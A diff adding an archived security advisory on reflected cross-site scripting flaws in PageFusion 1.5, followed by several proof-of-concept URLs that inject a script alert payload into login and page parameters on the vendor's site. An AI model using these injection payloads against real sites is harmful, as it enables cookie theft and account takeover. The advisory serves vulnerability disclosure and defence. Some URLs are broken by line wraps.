@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/30155/info
+
+PageFusion is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+PageFusion 1.5 is vulnerable; other versions may also be affected. 
+
+http://www.pagefusion.com//index.php?A=pf_login&SA=edit&PID=0000000001&PGID=rdWCFSLF9E&MID=14&acct_fname=%
+<http://www.pagefusion.com//index.php?A=pf_login&SA=edit&PID=0000000001&PGID=rdWCFSLF9E&MID=14&acct_fname=%>">/><script>alert(/xs/)</script>&acct_lname=T
+est&acct_username=hack3d&acct_email=hack3db0y%40gmail.com
+<http://40gmail.com>&acct_time_zone=-0600
+
+
+http://www.pagefusion.com//index.php?A=pf_login&SA=edit&PID=0000000001&PGID=rdWCFSLF9E&MID=14&acct_fname=%333&acct_lname=
+<http://www.pagefusion.com//index.php?A=pf_login&SA=edit&PID=0000000001&PGID=rdWCFSLF9E&MID=14&acct_fname=%333&acct_lname=>">/><script>alert(/xs/)</scrip
+t>&acct_username=hack3d&acct_email=hack3db0y%40gmail.com
+<http://40gmail.com>&acct_time_zone=-0600
+
+http://www.pagefusion.com/index.php?PID=">/><script>alert(/xs/)</script>
+http://www.pagefusion.com/index.php?PID=0000000001&PGID=
+<http://www.pagefusion.com/index.php?PID=0000000001&PGID=>">/><script>alert(/xs/)</script>
+
+http://www.pagefusion.com/index.php?rez=">/><script>alert(/xs/)</script>&jsd=1&js=Yes&profile=1
+
